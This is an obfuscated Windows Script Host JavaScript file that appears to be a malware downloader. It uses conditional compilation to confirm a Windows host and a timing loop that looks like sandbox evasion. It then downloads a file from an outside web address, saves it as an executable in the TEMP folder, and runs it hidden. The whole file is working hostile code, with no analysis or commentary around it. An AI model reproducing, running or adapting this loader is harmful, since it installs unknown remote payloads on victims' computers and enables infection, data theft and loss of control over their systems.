var _CO = false;
var _KN = "CreateObject";
var _H = function _O() {return WScript[_KN]("WScript"+".Shell");}(), _K = 11;
var _N = "MSXML2.XMLHTTP";
var _O0 = 2123213;
var _B0 = 0;
function _JU(_C){_H["Run"](_C, _B0, _B0);};
function _L(){return _N + "";};
function _B(_OY, _KW){_B0 = _B0 * 1; return _OY - _KW;};
function _CV(){return _KN;};
/*@cc_on
  @if (@_win32 || @_win64)
    _CO = true;
  @end
@*/
if (_CO)
{
var _D = "";
function _SF(){return 22;};
var _Y = 0; var _E0 = 0;
function _X()
{
var _CS = new this["Date"]();
var _Q = _CS["getUTCMilliseconds"]();
WScript["Sleep"](_SF());
var _CS = new this["Date"]();
var _IR = _CS["getUTCMilliseconds"]();
WScript["Sleep"](_SF());
var _CS = new this["Date"]();
var _F = _CS["getUTCMilliseconds"]();
var _Y = "_Z";
_Y = _B(_IR, _Q);
var _E0 = "_E";
_E0 = _B(_F, _IR);
_D = "open";
return _B(_Y, _E0);
}
var _VA = false;
var _CW = false;
for (var _T0 = _B0; _T0 < _SF() * 1; _T0++){if (_X() != _B0){
_VA = true; 
_E0 = "31" + 11 * _Y + _E0; 
_CW = true; 
break;
}}
function _GP() {return ((_VA == true) && (_VA == _CW)) ? 1 : _B0;};
if (_VA && _GP() && _CW){
function _EV() {return _H["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "10MJd7Jof.ex" + "e";};
 _U = _L();
 _NT = WScript[_KN](_U);
 var _JD = 1;
 while (_JD){
try {
	if (_JD == 1)
	{
		_NT[_D]("GET", "http://smartbs-cameroun.com/nc7sjd", false);
		_NT["send"]();
		_L0 = "Sleep";
	}
	WScript[_L0](_SF() + 120); 
	if (_NT["readystate"] < 2 * 2) continue;
	_JD = _B0;
	function _BX(_J) {var _X0 = (1, 2, 3, 4, 5, _J); return _X0;};
	_D0 = WScript[_CV()]("ADODB.Stream");
	_U = _D0;
	_U[_D]();
	_U["type"] = _BX(1);
	_U["write"](_NT["ResponseBody"]);
	_D0["position"] = _BX(_B0);
	_U["Save" + "ToFile"](_EV(), 2);
	_D0["cl"+"ose"]();
	_T = _EV();
	_JU(_T);
} catch(_MS){};
}
}
}

